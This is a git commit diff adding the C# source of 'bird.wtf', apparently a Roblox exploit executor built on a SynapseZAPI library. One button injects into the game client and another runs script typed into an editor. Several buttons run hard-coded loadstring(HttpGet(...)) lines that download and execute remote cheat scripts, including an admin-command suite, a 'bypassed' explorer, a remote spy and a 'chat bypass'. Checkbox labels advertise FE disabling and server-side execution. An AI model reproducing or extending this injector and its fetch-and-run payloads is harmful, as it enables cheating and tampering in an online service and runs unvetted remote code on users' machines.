870f35c662240b1565fcf28f5c7ffdc4168cb118
intentparrot392 <149796146+intentparrot392@users.noreply.github.com>
2024-10-20 14:29:36 +0800

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,238 @@
+﻿namespace bird.wtf_v2
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.button1 = new System.Windows.Forms.Button();
+            this.scintilla1 = new ScintillaNET.Scintilla();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.button4 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.button5 = new System.Windows.Forms.Button();
+            this.button6 = new System.Windows.Forms.Button();
+            this.button7 = new System.Windows.Forms.Button();
+            this.button8 = new System.Windows.Forms.Button();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.checkBox2 = new System.Windows.Forms.CheckBox();
+            this.checkBox3 = new System.Windows.Forms.CheckBox();
+            this.checkBox4 = new System.Windows.Forms.CheckBox();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(199, 563);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(143, 73);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Eksecute Scirpt";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // scintilla1
+            // 
+            this.scintilla1.AutoCMaxHeight = 9;
+            this.scintilla1.BiDirectionality = ScintillaNET.BiDirectionalDisplayType.Disabled;
+            this.scintilla1.CaretLineBackColor = System.Drawing.Color.White;
+            this.scintilla1.CaretLineVisible = true;
+            this.scintilla1.LexerName = null;
+            this.scintilla1.Location = new System.Drawing.Point(159, 12);
+            this.scintilla1.Name = "scintilla1";
+            this.scintilla1.ScrollWidth = 49;
+            this.scintilla1.Size = new System.Drawing.Size(848, 545);
+            this.scintilla1.TabIndents = true;
+            this.scintilla1.TabIndex = 1;
+            this.scintilla1.UseRightToLeftReadingLayout = false;
+            this.scintilla1.WrapMode = ScintillaNET.WrapMode.None;
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(515, 563);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(143, 73);
+            this.button2.TabIndex = 2;
+            this.button2.Text = "Injcet the hax";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(813, 563);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(143, 73);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "Cleer boks";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // button4
+            // 
+            this.button4.Location = new System.Drawing.Point(10, 58);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(143, 21);
+            this.button4.TabIndex = 4;
+            this.button4.Text = "infeenit yild";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(43, 12);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(74, 13);
+            this.label1.TabIndex = 5;
+            this.label1.Text = "pro script hub:";
+            // 
+            // button5
+            // 
+            this.button5.Location = new System.Drawing.Point(12, 85);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(143, 21);
+            this.button5.TabIndex = 6;
+            this.button5.Text = "black dex vee 3";
+            this.button5.UseVisualStyleBackColor = true;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            // 
+            // button6
+            // 
+            this.button6.Location = new System.Drawing.Point(12, 139);
+            this.button6.Name = "button6";
+            this.button6.Size = new System.Drawing.Size(143, 21);
+            this.button6.TabIndex = 7;
+            this.button6.Text = "chat bpyass";
+            this.button6.UseVisualStyleBackColor = true;
+            this.button6.Click += new System.EventHandler(this.button6_Click);
+            // 
+            // button7
+            // 
+            this.button7.Location = new System.Drawing.Point(12, 112);
+            this.button7.Name = "button7";
+            this.button7.Size = new System.Drawing.Size(143, 21);
+            this.button7.TabIndex = 8;
+            this.button7.Text = "simplspy";
+            this.button7.UseVisualStyleBackColor = true;
+            this.button7.Click += new System.EventHandler(this.button7_Click);
+            // 
+            // button8
+            // 
+            this.button8.Location = new System.Drawing.Point(12, 166);
+            this.button8.Name = "button8";
+            this.button8.Size = new System.Drawing.Size(143, 21);
+            this.button8.TabIndex = 9;
+            this.button8.Text = "unc tester wester";
+            this.button8.UseVisualStyleBackColor = true;
+            this.button8.Click += new System.EventHandler(this.button8_Click);
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(37, 540);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(78, 17);
+            this.checkBox1.TabIndex = 10;
+            this.checkBox1.Text = "FE disabler";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            // 
+            // checkBox2
+            // 
+            this.checkBox2.AutoSize = true;
+            this.checkBox2.Location = new System.Drawing.Point(37, 560);
+            this.checkBox2.Name = "checkBox2";
+            this.checkBox2.Size = new System.Drawing.Size(68, 17);
+            this.checkBox2.TabIndex = 11;
+            this.checkBox2.Text = "Kill all FE";
+            this.checkBox2.UseVisualStyleBackColor = true;
+            // 
+            // checkBox3
+            // 
+            this.checkBox3.AutoSize = true;
+            this.checkBox3.Location = new System.Drawing.Point(37, 583);
+            this.checkBox3.Name = "checkBox3";
+            this.checkBox3.Size = new System.Drawing.Size(70, 17);
+            this.checkBox3.TabIndex = 12;
+            this.checkBox3.Text = "FE admin";
+            this.checkBox3.UseVisualStyleBackColor = true;
+            // 
+            // checkBox4
+            // 
+            this.checkBox4.AutoSize = true;
+            this.checkBox4.Location = new System.Drawing.Point(37, 606);
+            this.checkBox4.Name = "checkBox4";
+            this.checkBox4.Size = new System.Drawing.Size(140, 17);
+            this.checkBox4.TabIndex = 13;
+            this.checkBox4.Text = "ServerSided Eksecution";
+            this.checkBox4.UseVisualStyleBackColor = true;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1019, 648);
+            this.Controls.Add(this.checkBox4);
+            this.Controls.Add(this.checkBox3);
+            this.Controls.Add(this.checkBox2);
+            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.button8);
+            this.Controls.Add(this.button7);
+            this.Controls.Add(this.button6);
+            this.Controls.Add(this.button5);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.scintilla1);
+            this.Controls.Add(this.button1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "bird.wtf";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private ScintillaNET.Scintilla scintilla1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button button5;
+        private System.Windows.Forms.Button button6;
+        private System.Windows.Forms.Button button7;
+        private System.Windows.Forms.Button button8;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.CheckBox checkBox2;
+        private System.Windows.Forms.CheckBox checkBox3;
+        private System.Windows.Forms.CheckBox checkBox4;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using ScintillaNET;
+using System.Windows.Forms;
+using SynapseZAPI;
+using System.IO;
+
+namespace bird.wtf_v2
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        public SynapseZAPI.SynapseZAPI synapseZAPI = new SynapseZAPI.SynapseZAPI();
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            synapseZAPI.Execute(Directory.GetCurrentDirectory(), scintilla1.Text);
+        }
+        private void button2_Click(object sender, EventArgs e)
+        {
+            synapseZAPI.Inject(Directory.GetCurrentDirectory() /*<- MainPath*/);
+        }
+        private void button3_Click(object sender, EventArgs e)
+        {
+            scintilla1.Text = string.Empty;
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            string scriptToExecute = "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source\"))()";
+            int result = synapseZAPI.Execute(System.IO.Directory.GetCurrentDirectory(), scriptToExecute);
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            string scriptToExecute = "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua\", true))()";
+            int result = synapseZAPI.Execute(System.IO.Directory.GetCurrentDirectory(), scriptToExecute);
+        }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            string scriptToExecute = "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/refs/heads/master/SimpleSpy.lua\"))()";
+            int result = synapseZAPI.Execute(System.IO.Directory.GetCurrentDirectory(), scriptToExecute);
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            string scriptToExecute = "loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/UserCreation')'25ms owns you'";
+            int result = synapseZAPI.Execute(System.IO.Directory.GetCurrentDirectory(), scriptToExecute);
+        }
+
+        private void button8_Click(object sender, EventArgs e)
+        {
+            string scriptToExecute = "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/refs/heads/main/UNCCheckEnv.lua\"))()";
+            int result = synapseZAPI.Execute(System.IO.Directory.GetCurrentDirectory(), scriptToExecute);
+        }
+    }
+}
